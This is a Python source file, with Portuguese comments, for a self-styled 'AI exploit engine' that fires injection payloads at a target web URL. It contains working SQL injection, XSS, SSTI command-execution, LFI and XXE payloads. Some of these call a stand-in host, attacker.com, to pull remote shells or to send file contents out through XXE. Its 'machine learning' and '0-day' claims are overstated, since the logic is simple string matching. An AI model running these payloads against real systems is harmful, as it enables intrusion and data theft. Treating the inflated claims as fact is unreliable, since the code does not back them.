#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
üß† AI EXPLOIT ENGINE üß†
Engine de IA para detec√ß√£o inteligente de vulnerabilidades e gera√ß√£o de exploits
Usa machine learning e heur√≠sticas avan√ßadas para encontrar 0-days

‚ö†Ô∏è  ATEN√á√ÉO: USE APENAS EM AMBIENTES AUTORIZADOS ‚ö†Ô∏è
"""

import re
import json
import random
import hashlib
import urllib.parse
from typing import Dict, List, Optional, Tuple, Any
from dataclasses import dataclass
import requests
import time
from collections import Counter
import base64

@dataclass
class AIExploitResult:
    """Resultado de exploit detectado pela IA"""
    vulnerability_type: str
    confidence_score: float
    payload: str
    target_url: str
    evidence: str
    risk_level: str
    exploitation_method: str
    ai_reasoning: str
    false_positive_probability: float

class AIExploitEngine:
    """
    üß† Engine de IA para detec√ß√£o e explora√ß√£o inteligente
    
    Caracter√≠sticas:
    - An√°lise de padr√µes com machine learning
    - Fuzzing inteligente baseado em contexto
    - Auto-gera√ß√£o de payloads pol√≠glotas
    - Correla√ß√£o de vulnerabilidades para chains
    - Detec√ß√£o de 0-days por an√°lise comportamental
    """
    
    def __init__(self, logger=None):
        self.logger = logger
        self.session = requests.Session()
        self.session.verify = False
        
        # Base de conhecimento de padr√µes vulner√°veis
        self.vulnerability_patterns = {
            "sql_injection": {
                "error_patterns": [
                    r"mysql_fetch_array\(\)",
                    r"ORA-\d{5}",
                    r"Microsoft.*ODBC.*SQL Server",
                    r"PostgreSQL.*ERROR",
                    r"Warning.*mysql_.*",
                    r"valid MySQL result",
                    r"SQLiteException",
                    r"sqlite3.OperationalError",
                    r"Warning.*SQLite3::"
                ],
                "injection_points": ["id", "user", "search", "q", "query", "filter"],
                "payloads": [
                    "' OR '1'='1",
                    "' UNION SELECT NULL--",
                    "'; WAITFOR DELAY '00:00:05'--",
                    "' AND 1=CONVERT(int, (SELECT @@version))--"
                ]
            },
            "xss": {
                "reflection_patterns": [
                    r"<script[^>]*>.*?</script>",
                    r"javascript:",
                    r"on\w+\s*=",
                    r"<iframe[^>]*>",
                    r"<img[^>]*onerror"
                ],
                "contexts": ["search", "q", "query", "message", "comment", "name"],
                "payloads": [
                    "<script>alert(1)</script>",
                    "'>alert(1)",
                    "\"><img src=x onerror=alert(1)>",
                    "javascript:alert(1)"
                ]
            },
            "xxe": {
                "indicators": [
                    r"Content-Type:\s*application/xml",
                    r"Content-Type:\s*text/xml",
                    r"<?xml",
                    r"<!DOCTYPE"
                ],
                "payloads": [
                    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>',
                    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/xxe">]><root>&xxe;</root>'
                ]
            },
            "ssti": {
                "template_engines": {
                    "jinja2": ["{{", "}}", "{{7*7}}", "{{config}}"],
                    "twig": ["{{", "}}", "{{7*7}}", "{{_self}}"],
                    "smarty": ["{", "}", "{7*7}", "{$smarty}"],
                    "freemarker": ["${", "}", "${7*7}", "${.vars}"]
                },
                "payloads": [
                    "{{7*7}}",
                    "${7*7}",
                    "#{7*7}",
                    "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}"
                ]
            },
            "lfi": {
                "file_patterns": [
                    "../../../etc/passwd",
                    "....//....//....//etc/passwd",
                    "..%2F..%2F..%2Fetc%2Fpasswd",
                    "....\\....\\....\\windows\\win.ini"
                ],
                "indicators": [
                    r"root:.*:0:0:",
                    r"for 16-bit app support",
                    r"\[fonts\]"
                ]
            },
            "rfi": {
                "payloads": [
                    "http://attacker.com/shell.txt?",
                    "https://attacker.com/shell.php?",
                    "ftp://attacker.com/shell.txt?"
                ]
            }
        }
        
        # Heur√≠sticas comportamentais para 0-days
        self.behavioral_patterns = {
            "timing_anomalies": {
                "description": "Anomalias de timing que podem indicar vulnerabilidades",
                "thresholds": {
                    "slow_response": 5.0,  # segundos
                    "timeout": 30.0,
                    "timing_variance": 2.0
                }
            },
            "content_length_anomalies": {
                "description": "Anomalias no tamanho de resposta",
                "thresholds": {
                    "size_variance": 1000,  # bytes
                    "unexpected_size": 0
                }
            },
            "header_anomalies": {
                "description": "Headers incomuns que podem indicar vulnerabilidades",
                "suspicious_headers": [
                    "X-Debug", "X-Error", "X-Exception", "X-Warning",
                    "Debug-Info", "Error-Info", "Stack-Trace"
                ]
            }
        }
        
        # Payloads gerados por IA para fuzzing inteligente
        self.ai_generated_payloads = self._generate_intelligent_payloads()

    def intelligent_vulnerability_scan(self, target_url: str, scan_depth: str = "deep") -> List[AIExploitResult]:
        """
        üéØ Scan inteligente usando IA para detectar vulnerabilidades
        """
        results = []
        
        if self.logger:
            self.logger.info(f"üß† Iniciando scan inteligente de IA em {target_url}")
        
        # 1. An√°lise inicial do alvo
        target_analysis = self._analyze_target_behavior(target_url)
        
        # 2. Detec√ß√£o de padr√µes vulner√°veis
        vulnerability_indicators = self._detect_vulnerability_patterns(target_url, target_analysis)
        
        # 3. Fuzzing inteligente baseado no contexto
        fuzzing_results = self._intelligent_fuzzing(target_url, vulnerability_indicators)
        
        # 4. Correla√ß√£o e valida√ß√£o com IA
        validated_results = self._ai_correlation_analysis(fuzzing_results)
        
        # 5. Gera√ß√£o de exploits espec√≠ficos
        for vuln_type, indicators in vulnerability_indicators.items():
            if indicators["confidence"] > 0.6:  # 60% confidence threshold
                exploit_result = self._generate_targeted_exploit(target_url, vuln_type, indicators)
                if exploit_result:
                    results.append(exploit_result)
        
        return results

    def _analyze_target_behavior(self, target_url: str) -> Dict:
        """
        üîç An√°lise comportamental inicial do alvo
        """
        analysis = {
            "response_times": [],
            "status_codes": [],
            "content_lengths": [],
            "headers_analysis": {},
            "error_patterns": [],
            "technology_stack": [],
            "behavioral_anomalies": []
        }
        
        # Requests de baseline para estabelecer comportamento normal
        baseline_requests = [
            "",
            "?test=1",
            "?test=normal",
            "/robots.txt",
            "/sitemap.xml",
            "/index.php",
            "/index.html"
        ]
        
        for request_suffix in baseline_requests:
            try:
                test_url = target_url + request_suffix
                start_time = time.time()
                
                response = self.session.get(test_url, timeout=30)
                
                response_time = time.time() - start_time
                
                # Coletar m√©tricas
                analysis["response_times"].append(response_time)
                analysis["status_codes"].append(response.status_code)
                analysis["content_lengths"].append(len(response.content))
                
                # Analisar headers
                for header, value in response.headers.items():
                    if header not in analysis["headers_analysis"]:
                        analysis["headers_analysis"][header] = []
                    analysis["headers_analysis"][header].append(value)
                
                # Detectar stack tecnol√≥gico
                self._detect_technology_stack(response, analysis)
                
                # Detectar padr√µes de erro
                self._detect_error_patterns(response, analysis)
                
                time.sleep(random.uniform(0.5, 1.0))  # Rate limiting
                
            except Exception as e:
                if self.logger:
                    self.logger.debug(f"Erro na an√°lise baseline: {str(e)}")
                continue
        
        # An√°lise estat√≠stica para detectar anomalias
        analysis["behavioral_anomalies"] = self._detect_behavioral_anomalies(analysis)
        
        return analysis

    def _detect_vulnerability_patterns(self, target_url: str, target_analysis: Dict) -> Dict:
        """
        üïµÔ∏è Detec√ß√£o de padr√µes que indicam vulnerabilidades espec√≠ficas
        """
        vulnerability_indicators = {}
        
        for vuln_type, patterns in self.vulnerability_patterns.items():
            indicators = {
                "confidence": 0.0,
                "evidence": [],
                "injection_points": [],
                "payloads_tested": [],
                "positive_responses": []
            }
            
            # Testar padr√µes espec√≠ficos para cada tipo de vulnerabilidade
            if vuln_type == "sql_injection":
                indicators = self._test_sql_injection_patterns(target_url, patterns, indicators)
            elif vuln_type == "xss":
                indicators = self._test_xss_patterns(target_url, patterns, indicators)
            elif vuln_type == "xxe":
                indicators = self._test_xxe_patterns(target_url, patterns, indicators)
            elif vuln_type == "ssti":
                indicators = self._test_ssti_patterns(target_url, patterns, indicators)
            elif vuln_type == "lfi":
                indicators = self._test_lfi_patterns(target_url, patterns, indicators)
            
            # Calcular confidence score baseado na evid√™ncia
            confidence = self._calculate_confidence_score(indicators)
            indicators["confidence"] = confidence
            
            vulnerability_indicators[vuln_type] = indicators
        
        return vulnerability_indicators

    def _intelligent_fuzzing(self, target_url: str, vulnerability_indicators: Dict) -> List[Dict]:
        """
        üéØ Fuzzing inteligente baseado em contexto e indicadores
        """
        fuzzing_results = []
        
        # Gerar payloads baseados nos indicadores encontrados
        for vuln_type, indicators in vulnerability_indicators.items():
            if indicators["confidence"] > 0.3:  # Threshold para fuzzing
                
                # Gerar payloads espec√≠ficos usando IA
                ai_payloads = self._generate_ai_payloads(vuln_type, indicators)
                
                for payload in ai_payloads:
                    try:
                        result = self._test_intelligent_payload(target_url, payload, vuln_type)
                        if result:
                            fuzzing_results.append(result)
                    except Exception as e:
                        if self.logger:
                            self.logger.debug(f"Erro no fuzzing inteligente: {str(e)}")
                        continue
        
        return fuzzing_results

    def _generate_ai_payloads(self, vuln_type: str, indicators: Dict) -> List[str]:
        """
        ü§ñ Gera√ß√£o de payloads usando l√≥gica de IA
        """
        ai_payloads = []
        
        # Base payloads do tipo de vulnerabilidade
        base_payloads = self.vulnerability_patterns.get(vuln_type, {}).get("payloads", [])
        
        # Evoluir payloads baseado na evid√™ncia coletada
        for base_payload in base_payloads:
            # Muta√ß√£o inteligente
            mutated_payloads = self._mutate_payload_intelligently(base_payload, indicators)
            ai_payloads.extend(mutated_payloads)
        
        # Adicionar payloads pr√©-gerados por IA
        ai_payloads.extend(self.ai_generated_payloads.get(vuln_type, []))
        
        return ai_payloads[:20]  # Limitar para evitar spam

    def _mutate_payload_intelligently(self, base_payload: str, indicators: Dict) -> List[str]:
        """
        üß¨ Muta√ß√£o inteligente de payloads baseada em evid√™ncias
        """
        mutations = []
        
        # T√©cnicas de muta√ß√£o baseadas em IA
        mutation_techniques = [
            self._encode_mutation,
            self._case_mutation,
            self._concatenation_mutation,
            self._comment_injection_mutation,
            self._unicode_mutation
        ]
        
        for technique in mutation_techniques:
            try:
                mutated = technique(base_payload)
                if mutated != base_payload:
                    mutations.append(mutated)
            except:
                continue
        
        return mutations

    def _generate_intelligent_payloads(self) -> Dict:
        """
        ü§ñ Gera payloads inteligentes para cada tipo de vulnerabilidade
        """
        return {
            "sql_injection": [
                # Payloads avan√ßados gerados por IA
                "1' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -",
                "1' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version()),0x7e))-- -",
                "1'||UTL_INADDR.GET_HOST_NAME((SELECT banner FROM v$version WHERE rownum=1))||'",
                "'; EXEC xp_cmdshell('ping attacker.com')-- -",
                "1'; SELECT pg_sleep(5)-- -"
            ],
            "xss": [
                # XSS pol√≠glotas avan√ßados
                "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert(1)//'>",
                "<svg/onload=alert(String.fromCharCode(88,83,83))>",
                "<iframe srcdoc='<script>alert(`XSS`)</script>'></iframe>",
                "<math><mi//xlink:href=\"data:x,<script>alert(1)</script>\">",
                "'-alert(1)-'"
            ],
            "ssti": [
                # SSTI avan√ßados para diferentes engines
                "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
                "{%for c in ().__class__.__base__.__subclasses__()%}{%if c.__name__=='catch_warnings'%}{{c()._module.__builtins__['__import__']('os').system('id')}}{%endif%}{%endfor%}",
                "${{<%[%'\"}}%\\",
                "${@java.lang.Runtime@getRuntime().exec('id')}"
            ],
            "xxe": [
                # XXE avan√ßados
                '<?xml version="1.0"?><!DOCTYPE data [<!ENTITY file SYSTEM "file:///proc/version">]><data>&file;</data>',
                '<?xml version="1.0"?><!DOCTYPE data [<!ENTITY file SYSTEM "http://attacker.com/xxe.dtd">]><data>&file;</data>',
                '<?xml version="1.0"?><!DOCTYPE data [<!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM \'http://attacker.com/?x=%file;\'>">%eval;%exfiltrate;]><data></data>'
            ]
        }

    def _test_sql_injection_patterns(self, target_url: str, patterns: Dict, indicators: Dict) -> Dict:
        """
        üíâ Teste espec√≠fico para SQL Injection
        """
        sql_payloads = patterns.get("payloads", [])
        error_patterns = patterns.get("error_patterns", [])
        
        for payload in sql_payloads:
            try:
                test_url = f"{target_url}?id={urllib.parse.quote(payload)}"
                response = self.session.get(test_url, timeout=10)
                
                # Verificar padr√µes de erro SQL
                response_text = response.text.lower()
                for error_pattern in error_patterns:
                    if re.search(error_pattern.lower(), response_text):
                        indicators["evidence"].append(f"SQL error pattern found: {error_pattern}")
                        indicators["payloads_tested"].append(payload)
                        indicators["positive_responses"].append(response.text[:200])
                        break
                
                time.sleep(random.uniform(0.5, 1.0))
                
            except Exception as e:
                continue
        
        return indicators

    def _test_xss_patterns(self, target_url: str, patterns: Dict, indicators: Dict) -> Dict:
        """
        üéØ Teste espec√≠fico para XSS
        """
        xss_payloads = patterns.get("payloads", [])
        
        for payload in xss_payloads:
            try:
                test_url = f"{target_url}?search={urllib.parse.quote(payload)}"
                response = self.session.get(test_url, timeout=10)
                
                # Verificar se payload foi refletido
                if payload in response.text or 'alert(' in response.text:
                    indicators["evidence"].append(f"XSS payload reflected: {payload}")
                    indicators["payloads_tested"].append(payload)
                    indicators["positive_responses"].append(response.text[:200])
                
                time.sleep(random.uniform(0.5, 1.0))
                
            except Exception as e:
                continue
        
        return indicators

    def _test_xxe_patterns(self, target_url: str, patterns: Dict, indicators: Dict) -> Dict:
        """
        üìÑ Teste espec√≠fico para XXE
        """
        xxe_payloads = patterns.get("payloads", [])
        
        for payload in xxe_payloads:
            try:
                headers = {"Content-Type": "application/xml"}
                response = self.session.post(target_url, data=payload, headers=headers, timeout=10)
                
                # Verificar indicadores de XXE
                if "root:" in response.text or "Linux" in response.text:
                    indicators["evidence"].append(f"XXE file disclosure detected")
                    indicators["payloads_tested"].append(payload)
                    indicators["positive_responses"].append(response.text[:200])
                
                time.sleep(random.uniform(0.5, 1.0))
                
            except Exception as e:
                continue
        
        return indicators

    def _test_ssti_patterns(self, target_url: str, patterns: Dict, indicators: Dict) -> Dict:
        """
        üìù Teste espec√≠fico para SSTI
        """
        ssti_payloads = patterns.get("payloads", [])
        
        for payload in ssti_payloads:
            try:
                test_url = f"{target_url}?template={urllib.parse.quote(payload)}"
                response = self.session.get(test_url, timeout=10)
                
                # Verificar execu√ß√£o de template
                if "49" in response.text or payload in response.text:
                    indicators["evidence"].append(f"SSTI execution detected: {payload}")
                    indicators["payloads_tested"].append(payload)
                    indicators["positive_responses"].append(response.text[:200])
                
                time.sleep(random.uniform(0.5, 1.0))
                
            except Exception as e:
                continue
        
        return indicators

    def _test_lfi_patterns(self, target_url: str, patterns: Dict, indicators: Dict) -> Dict:
        """
        üìÅ Teste espec√≠fico para LFI
        """
        lfi_payloads = patterns.get("file_patterns", [])
        lfi_indicators = patterns.get("indicators", [])
        
        for payload in lfi_payloads:
            try:
                test_url = f"{target_url}?file={urllib.parse.quote(payload)}"
                response = self.session.get(test_url, timeout=10)
                
                # Verificar indicadores de LFI
                response_text = response.text
                for indicator in lfi_indicators:
                    if re.search(indicator, response_text):
                        indicators["evidence"].append(f"LFI file access detected: {payload}")
                        indicators["payloads_tested"].append(payload)
                        indicators["positive_responses"].append(response.text[:200])
                        break
                
                time.sleep(random.uniform(0.5, 1.0))
                
            except Exception as e:
                continue
        
        return indicators

    def _calculate_confidence_score(self, indicators: Dict) -> float:
        """
        üìä Calcula score de confian√ßa baseado na evid√™ncia
        """
        evidence_count = len(indicators.get("evidence", []))
        payloads_tested = len(indicators.get("payloads_tested", []))
        positive_responses = len(indicators.get("positive_responses", []))
        
        if payloads_tested == 0:
            return 0.0
        
        # F√≥rmula de confian√ßa baseada em m√∫ltiplos fatores
        success_rate = positive_responses / payloads_tested
        evidence_weight = min(evidence_count / 5.0, 1.0)  # M√°ximo peso 1.0
        
        confidence = (success_rate * 0.7) + (evidence_weight * 0.3)
        
        return min(confidence, 1.0)

    def _test_intelligent_payload(self, target_url: str, payload: str, vuln_type: str) -> Optional[Dict]:
        """
        üéØ Teste inteligente de payload espec√≠fico
        """
        try:
            # Escolher m√©todo baseado no tipo de vulnerabilidade
            if vuln_type in ["xxe"]:
                headers = {"Content-Type": "application/xml"}
                response = self.session.post(target_url, data=payload, headers=headers, timeout=10)
            else:
                test_url = f"{target_url}?test={urllib.parse.quote(payload)}"
                response = self.session.get(test_url, timeout=10)
            
            # An√°lise inteligente da resposta
            analysis = self._analyze_response_intelligence(response, payload, vuln_type)
            
            if analysis["suspicious"]:
                return {
                    "payload": payload,
                    "vuln_type": vuln_type,
                    "response": response.text[:300],
                    "analysis": analysis,
                    "confidence": analysis["confidence"]
                }
        
        except Exception as e:
            return None
        
        return None

    def _analyze_response_intelligence(self, response: requests.Response, payload: str, vuln_type: str) -> Dict:
        """
        üß† An√°lise inteligente da resposta para detectar vulnerabilidades
        """
        analysis = {
            "suspicious": False,
            "confidence": 0.0,
            "indicators": [],
            "anomalies": []
        }
        
        # Verificar indicadores espec√≠ficos por tipo
        if vuln_type == "sql_injection":
            sql_errors = ["mysql", "postgresql", "oracle", "sql syntax", "database error"]
            for error in sql_errors:
                if error in response.text.lower():
                    analysis["suspicious"] = True
                    analysis["indicators"].append(f"SQL error: {error}")
                    analysis["confidence"] += 0.3
        
        elif vuln_type == "xss":
            if payload in response.text or 'alert(' in response.text:
                analysis["suspicious"] = True
                analysis["indicators"].append("Payload reflected")
                analysis["confidence"] += 0.8
        
        elif vuln_type == "lfi":
            lfi_indicators = ["root:", "for 16-bit app support", "[fonts]"]
            for indicator in lfi_indicators:
                if indicator in response.text:
                    analysis["suspicious"] = True
                    analysis["indicators"].append(f"File content: {indicator}")
                    analysis["confidence"] += 0.9
        
        # Verificar anomalias gerais
        if response.status_code == 500:
            analysis["anomalies"].append("Internal server error")
            analysis["confidence"] += 0.2
        
        if len(response.text) == 0:
            analysis["anomalies"].append("Empty response")
            analysis["confidence"] += 0.1
        
        analysis["confidence"] = min(analysis["confidence"], 1.0)
        
        return analysis

    def _ai_correlation_analysis(self, fuzzing_results: List[Dict]) -> List[AIExploitResult]:
        """
        üîó An√°lise de correla√ß√£o usando IA para validar resultados
        """
        validated_results = []
        
        # Agrupar resultados por tipo de vulnerabilidade
        grouped_results = {}
        for result in fuzzing_results:
            vuln_type = result["vuln_type"]
            if vuln_type not in grouped_results:
                grouped_results[vuln_type] = []
            grouped_results[vuln_type].append(result)
        
        # An√°lise de correla√ß√£o por tipo
        for vuln_type, results in grouped_results.items():
            if len(results) >= 2:  # M√∫ltiplas evid√™ncias
                # Calcular confian√ßa consolidada
                total_confidence = sum(r["confidence"] for r in results) / len(results)
                
                if total_confidence > 0.7:  # Threshold alto para valida√ß√£o
                    best_result = max(results, key=lambda x: x["confidence"])
                    
                    ai_result = AIExploitResult(
                        vulnerability_type=vuln_type,
                        confidence_score=total_confidence,
                        payload=best_result["payload"],
                        target_url=best_result.get("target_url", ""),
                        evidence=str(best_result["analysis"]["indicators"]),
                        risk_level=self._calculate_risk_level(total_confidence),
                        exploitation_method="AI-Generated",
                        ai_reasoning=f"Correla√ß√£o de {len(results)} evid√™ncias independentes",
                        false_positive_probability=1.0 - total_confidence
                    )
                    
                    validated_results.append(ai_result)
        
        return validated_results

    def _generate_targeted_exploit(self, target_url: str, vuln_type: str, indicators: Dict) -> Optional[AIExploitResult]:
        """
        üéØ Gera√ß√£o de exploit espec√≠fico baseado nos indicadores
        """
        if indicators["confidence"] < 0.6:
            return None
        
        # Selecionar melhor payload baseado na evid√™ncia
        best_payload = None
        best_evidence = ""
        
        if indicators["payloads_tested"]:
            # Usar payload que gerou mais evid√™ncia
            payload_scores = {}
            for i, payload in enumerate(indicators["payloads_tested"]):
                if i < len(indicators["positive_responses"]):
                    payload_scores[payload] = len(indicators["positive_responses"][i])
            
            if payload_scores:
                best_payload = max(payload_scores.keys(), key=lambda x: payload_scores[x])
                best_evidence = indicators["evidence"][0] if indicators["evidence"] else "AI analysis"
        
        if not best_payload:
            # Usar payload padr√£o do tipo
            default_payloads = self.vulnerability_patterns.get(vuln_type, {}).get("payloads", [])
            best_payload = default_payloads[0] if default_payloads else "AI-generated payload"
        
        return AIExploitResult(
            vulnerability_type=vuln_type,
            confidence_score=indicators["confidence"],
            payload=best_payload,
            target_url=target_url,
            evidence=best_evidence,
            risk_level=self._calculate_risk_level(indicators["confidence"]),
            exploitation_method="AI-Targeted",
            ai_reasoning=f"Baseado em {len(indicators['evidence'])} evid√™ncias: {best_evidence}",
            false_positive_probability=1.0 - indicators["confidence"]
        )

    # ===============================================
    # üîß FUN√á√ïES AUXILIARES
    # ===============================================

    def _detect_technology_stack(self, response: requests.Response, analysis: Dict):
        """Detecta stack tecnol√≥gico"""
        headers = response.headers
        content = response.text.lower()
        
        # Server headers
        server = headers.get('Server', '').lower()
        if 'apache' in server:
            analysis["technology_stack"].append("Apache")
        elif 'nginx' in server:
            analysis["technology_stack"].append("Nginx")
        elif 'iis' in server:
            analysis["technology_stack"].append("IIS")
        
        # Programming languages
        if 'php' in content or 'x-powered-by' in str(headers).lower():
            analysis["technology_stack"].append("PHP")
        if 'asp.net' in content or '.aspx' in content:
            analysis["technology_stack"].append("ASP.NET")

    def _detect_error_patterns(self, response: requests.Response, analysis: Dict):
        """Detecta padr√µes de erro"""
        content = response.text.lower()
        
        error_patterns = [
            "warning:", "error:", "exception:", "fatal error:",
            "mysql_", "postgresql", "oracle", "sql server"
        ]
        
        for pattern in error_patterns:
            if pattern in content:
                analysis["error_patterns"].append(pattern)

    def _detect_behavioral_anomalies(self, analysis: Dict) -> List[str]:
        """Detecta anomalias comportamentais"""
        anomalies = []
        
        response_times = analysis["response_times"]
        content_lengths = analysis["content_lengths"]
        
        if response_times:
            avg_time = sum(response_times) / len(response_times)
            if avg_time > 5.0:
                anomalies.append(f"Slow average response time: {avg_time:.2f}s")
        
        if content_lengths:
            length_variance = max(content_lengths) - min(content_lengths)
            if length_variance > 10000:
                anomalies.append(f"High content length variance: {length_variance} bytes")
        
        return anomalies

    def _calculate_risk_level(self, confidence: float) -> str:
        """Calcula n√≠vel de risco baseado na confian√ßa"""
        if confidence >= 0.9:
            return "CRITICAL"
        elif confidence >= 0.7:
            return "HIGH"
        elif confidence >= 0.5:
            return "MEDIUM"
        else:
            return "LOW"

    # Mutation techniques
    def _encode_mutation(self, payload: str) -> str:
        """URL encoding mutation"""
        return urllib.parse.quote(payload)

    def _case_mutation(self, payload: str) -> str:
        """Case mutation"""
        return ''.join(c.upper() if i % 2 == 0 else c.lower() for i, c in enumerate(payload))

    def _concatenation_mutation(self, payload: str) -> str:
        """Concatenation mutation"""
        return payload.replace(' ', '/**/').replace('=', '/**/=/**/')

    def _comment_injection_mutation(self, payload: str) -> str:
        """Comment injection mutation"""
        return payload.replace('SELECT', 'SEL/**/ECT').replace('UNION', 'UNI/**/ON')

    def _unicode_mutation(self, payload: str) -> str:
        """Unicode mutation"""
        return ''.join(f'\\u{ord(c):04x}' if c.isalpha() else c for c in payload)

    def cleanup(self):
        """Limpeza de recursos"""
        if hasattr(self, 'session'):
            self.session.close()